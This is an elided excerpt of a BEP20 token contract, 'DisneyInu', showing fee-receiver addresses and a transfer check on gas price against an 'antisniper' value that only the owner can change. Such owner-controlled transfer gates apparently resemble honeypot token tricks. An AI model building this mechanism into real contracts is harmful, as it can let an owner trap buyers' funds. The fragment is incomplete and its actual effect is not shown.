...
contract DisneyInu is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x8C7f0f713DF0AfD0ed86cdFa6590Fe27a6B2967E;
        utilityFeeReceiver = msg.sender;
        devFeeReceiver = 0x7aa0C07CaC2cF23B2B61Ef334F0b6bD95521dF50;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= antisniper && recipient != pair) {
    ...
    function Updateantisniper (uint256 _antisniper) public onlyOwner {
               antisniper = _antisniper * 1 gwei; 
